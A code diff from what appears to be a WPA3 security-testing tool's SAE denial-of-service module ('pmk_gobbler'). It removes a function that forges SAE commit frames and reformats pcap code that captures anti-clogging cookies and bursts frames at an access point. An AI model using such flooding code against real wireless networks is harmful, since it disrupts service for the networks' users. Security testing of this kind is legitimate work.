@@ -18,33 +18,6 @@ using namespace chrono;
 
 namespace wpa3_tester::pmk_gobbler {
 
-    static RadioTap make_sae_commit(const HWAddress<6> &ap_mac,
-                                    const HWAddress<6> &sta_mac,
-                                    dos_helpers::SAEPair sae_params) {
-        Dot11Authentication auth;
-        auth.addr1(ap_mac);
-        auth.addr2(sta_mac);
-        auth.addr3(ap_mac);
-        auth.type(Dot11::MANAGEMENT);
-        auth.subtype(Dot11::AUTH);
-        auth.auth_algorithm(3); // SAE
-        auth.auth_seq_number(1);
-        auth.status_code(0);
-
-        // group 19 (P-256) | optional ACM token | dummy scalar | dummy element
-        vector<uint8_t> payload;
-        payload.push_back(0x13);
-        payload.push_back(0x00);
-        payload.insert(payload.end(), sae_params.token.begin(), sae_params.token.end());
-        payload.insert(payload.end(), sae_params.scalar.begin(), sae_params.scalar.end());
-        payload.insert(payload.end(), sae_params.element.begin(), sae_params.element.end());
-
-        auth.inner_pdu(RawPDU(payload));
-        RadioTap rt;
-        rt.inner_pdu(auth);
-        return rt;
-    }
-
     //TODO add test
     optional<ACMCookie> parse_acm_response(const uint8_t *packet, const uint32_t len) {
         const auto sae = dos_helpers::parse_sae_commit(packet, len);
@@ -62,15 +35,15 @@ namespace wpa3_tester::pmk_gobbler {
     void capture_cookies(const string &sniff_iface, const HWAddress<6> &ap_mac, CookieStore &store) {
         char errbuf[PCAP_ERRBUF_SIZE];
         pcap_t *handle = pcap_open_live(sniff_iface.c_str(), 2000, 1, 0, errbuf);
-        if (!handle) throw runtime_error("pcap_open_live failed: " + string(errbuf));
+        if (!handle) throw runtime_error("pcap_open_live failed: "+string(errbuf));
         auto handle_guard = unique_ptr<pcap_t, void(*)(pcap_t*)>(handle, pcap_close);
 
         pcap_setnonblock(handle, 1, errbuf);
 
-        const string filter = "wlan type mgt subtype auth and wlan addr2 " + ap_mac.to_string();
+        const string filter = "wlan type mgt subtype auth and wlan addr2 "+ap_mac.to_string();
         bpf_program fp{};
         if (pcap_compile(handle, &fp, filter.c_str(), 1, PCAP_NETMASK_UNKNOWN) < 0)
-            throw runtime_error("pcap_compile failed: " + string(pcap_geterr(handle)));
+            throw runtime_error("pcap_compile failed: "+string(pcap_geterr(handle)));
         pcap_setfilter(handle, &fp);
         pcap_freecode(&fp);
 
@@ -78,13 +51,13 @@ namespace wpa3_tester::pmk_gobbler {
         if (fd == -1) throw runtime_error("pcap fd not selectable");
         pollfd pfd = { .fd = fd, .events = POLLIN, .revents = 0 };
 
-        log(LogLevel::INFO, "Cookie capture started on " + sniff_iface);
+        log(LogLevel::INFO, "Cookie capture started on "+sniff_iface);
 
         while (!store.stop.load()) {
             const int ret = poll(&pfd, 1, 100);
             if (ret < 0) {
                 if (errno == EINTR) continue;
-                log(LogLevel::WARNING, "capture poll error: " + to_string(errno));
+                log(LogLevel::WARNING, "capture poll error: "+to_string(errno));
                 break;
             }
             if (ret == 0 || !(pfd.revents & POLLIN)) continue;
@@ -112,7 +85,7 @@ namespace wpa3_tester::pmk_gobbler {
 
         char errbuf[PCAP_ERRBUF_SIZE];
         pcap_t *handle = pcap_open_live(iface.c_str(), 2000, 1, 0, errbuf);
-        if (!handle) throw runtime_error("pcap_open_live failed: " + string(errbuf));
+        if (!handle) throw runtime_error("pcap_open_live failed: "+string(errbuf));
         auto handle_guard = unique_ptr<pcap_t, void(*)(pcap_t*)>(handle, pcap_close);
 
         pcap_setnonblock(handle, 1, errbuf);
@@ -120,7 +93,7 @@ namespace wpa3_tester::pmk_gobbler {
         const string filter = "wlan type mgt subtype auth";
         bpf_program fp{};
         if (pcap_compile(handle, &fp, filter.c_str(), 1, PCAP_NETMASK_UNKNOWN) < 0)
-            throw runtime_error("pcap_compile failed: " + string(pcap_geterr(handle)));
+            throw runtime_error("pcap_compile failed: "+string(pcap_geterr(handle)));
         pcap_setfilter(handle, &fp);
         pcap_freecode(&fp);
 
@@ -155,7 +128,7 @@ namespace wpa3_tester::pmk_gobbler {
                 }
             }
         }
-        throw run_err("ACM not activated after " + to_string(trigger_count) + " frames");
+        throw run_err("ACM not activated after "+to_string(trigger_count) + " frames");
     }
 
     void burst_with_cookies(const string &iface, const HWAddress<6> &ap_mac,
@@ -233,7 +206,7 @@ namespace wpa3_tester::pmk_gobbler {
             try {
                 capture_cookies(sniff_iface, ap_mac, store);
             } catch (const exception &e) {
-                log(LogLevel::ERROR, "Capture thread: " + string(e.what()));
+                log(LogLevel::ERROR, "Capture thread: "+string(e.what()));
                 store.stop.store(true);
             }
         });
